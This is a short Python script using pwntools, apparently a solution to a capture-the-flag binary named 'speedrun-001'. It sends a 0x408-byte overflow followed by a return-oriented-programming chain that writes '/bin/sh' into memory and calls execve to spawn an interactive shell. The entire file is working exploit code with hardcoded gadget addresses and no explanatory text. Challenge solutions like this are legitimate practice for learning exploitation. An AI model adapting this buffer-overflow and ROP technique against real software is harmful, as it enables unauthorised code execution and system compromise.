from pwn import *

s = process("./speedrun-001")


pop_rax_ret = 0x0000000000415664
pop_rdi_ret = 0x0000000000400686
pop_rsi_ret = 0x00000000004101f3
pop_rdx_ret = 0x00000000004498b5
bin_sh = 0x00000000006b7000		# address for the string /bin/sh
mov_gadget = 0x0000000000446feb		# mov qword ptr [rdi], rsi ; ret
syscall = 0x000000000040129c

payload = "A"*0x408
rop = ""
rop += p64(pop_rdi_ret)
rop += p64(bin_sh)
rop += p64(pop_rsi_ret)
rop += p64(0x0068732f6e69622f)		# /bin/sh\x00
rop += p64(mov_gadget)

rop += p64(pop_rax_ret)
rop += p64(59)
rop += p64(pop_rdi_ret)
rop += p64(bin_sh)
rop += p64(pop_rsi_ret)
rop += p64(0x0)
rop += p64(pop_rdx_ret)
rop += p64(0x0)
rop += p64(syscall)

payload += rop
s.send(payload)
s.interactive()


